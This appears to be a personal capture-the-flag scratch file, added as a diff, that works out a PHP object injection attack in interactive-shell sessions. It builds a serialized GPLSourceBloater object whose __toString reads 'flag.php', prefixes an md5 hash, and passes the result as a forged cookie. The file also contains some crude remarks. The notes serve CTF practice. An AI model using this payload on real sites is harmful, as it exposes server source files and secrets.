@@ -1,0 +1,83 @@
+$todos[] = "primo";
+$m = serialize($todos);
+$h = md5($m);
+
+php > $todos[] = "primo";
+php > $m = serialize($todos);
+php > $h = md5($m);
+php > echo $h;
+d15001ad2b92d8677bb91f72b0b7c588
+php > $c = "d15001ad2b92d8677bb91f72b0b7c588a:1:{i:0;s:5:\"primo\";}";
+php > $h = substr($c, 0, 32);
+php > $m = substr($c, 32);
+php > echo $h;
+d15001ad2b92d8677bb91f72b0b7c588
+php > echo md5($m);
+d15001ad2b92d8677bb91f72b0b7c588
+php > echo "oh yes bitch";
+oh yes bitch
+
+
+only php code:
+
+$todos[] = "primo";
+$m = serialize($todos);
+$h = md5($m);
+
+$todos[] = "primo";
+$m = serialize($todos);
+$h = md5($m);
+echo $h;
+
+$c = "d15001ad2b92d8677bb91f72b0b7c588a:1:{i:0;s:5:\"primo\";}";
+$h = substr($c, 0, 32);
+$m = substr($c, 32);
+
+
+------------------------------
+
+
+php > Class GPLSourceBloater{
+php {     public function __toString()
+php {     {
+php {         return highlight_file('license.txt', true).highlight_file($this->source, true);
+php {     }
+php { }
+php > $o = new GPLSourceBloater();
+php > $o->source = 'backup.txt';
+php > echo $o;
+<code><span style="color: #000000">
+w&nbsp;josiph&nbsp;stalin</span>
+</code><code><span style="color: #000000">
+$todos[]&nbsp;=&nbsp;"primo";<br />$m&nbsp;=&nbsp;serialize($todos);<br />$h&nbsp;=&nbsp;md5($m);<br /><br />php&nbsp;&gt;&nbsp;$todos[]&nbsp;=&nbsp;"primo";<br />php&nbsp;&gt;&nbsp;$m&nbsp;=&nbsp;serialize($todos);<br />php&nbsp;&gt;&nbsp;$h&nbsp;=&nbsp;md5($m);<br />php&nbsp;&gt;&nbsp;echo&nbsp;$h;<br />d15001ad2b92d8677bb91f72b0b7c588<br />php&nbsp;&gt;&nbsp;$c&nbsp;=&nbsp;"d15001ad2b92d8677bb91f72b0b7c588a:1:{i:0;s:5:\"primo\";}";<br />php&nbsp;&gt;&nbsp;$h&nbsp;=&nbsp;substr($c,&nbsp;0,&nbsp;32);<br />php&nbsp;&gt;&nbsp;$m&nbsp;=&nbsp;substr($c,&nbsp;32);<br />php&nbsp;&gt;&nbsp;echo&nbsp;$h;<br />d15001ad2b92d8677bb91f72b0b7c588<br />php&nbsp;&gt;&nbsp;echo&nbsp;md5($m);<br />d15001ad2b92d8677bb91f72b0b7c588<br />php&nbsp;&gt;&nbsp;echo&nbsp;"oh&nbsp;yes&nbsp;bitch";<br />oh&nbsp;yes&nbsp;bitch<br /><br /><br />only&nbsp;php&nbsp;code:<br /><br />$todos[]&nbsp;=&nbsp;"primo";<br />$m&nbsp;=&nbsp;serialize($todos);<br />$h&nbsp;=&nbsp;md5($m);<br /><br />$todos[]&nbsp;=&nbsp;"primo";<br />$m&nbsp;=&nbsp;serialize($todos);<br />$h&nbsp;=&nbsp;md5($m);<br />echo&nbsp;$h;<br /><br />$c&nbsp;=&nbsp;"d15001ad2b92d8677bb91f72b0b7c588a:1:{i:0;s:5:\"primo\";}";<br />$h&nbsp;=&nbsp;substr($c,&nbsp;0,&nbsp;32);<br />$m&nbsp;=&nbsp;substr($c,&nbsp;32);<br /><br /><br /><br /><br /></span>
+</code>
+php > $todos[] = $o;
+php > count($todos);
+php > echo count($todos);
+1
+
+
+------------
+
+final php code:
+
+Class GPLSourceBloater{
+    public function __toString()
+    {
+        return highlight_file('license.txt', true).highlight_file($this->source, true);
+    }
+}
+
+$o = new GPLSourceBloater();
+$o->source = 'flag.php';
+
+$todos[] = $o;
+
+$m = serialize($todos);
+$h = md5($m);
+
+
+echo $h.$m;
+I take the result that will be the cookies, but they need to be url escaped.
+In this way, I can print them with the page flag.php through the echo of the object.
+This because the echo prints the toString() method
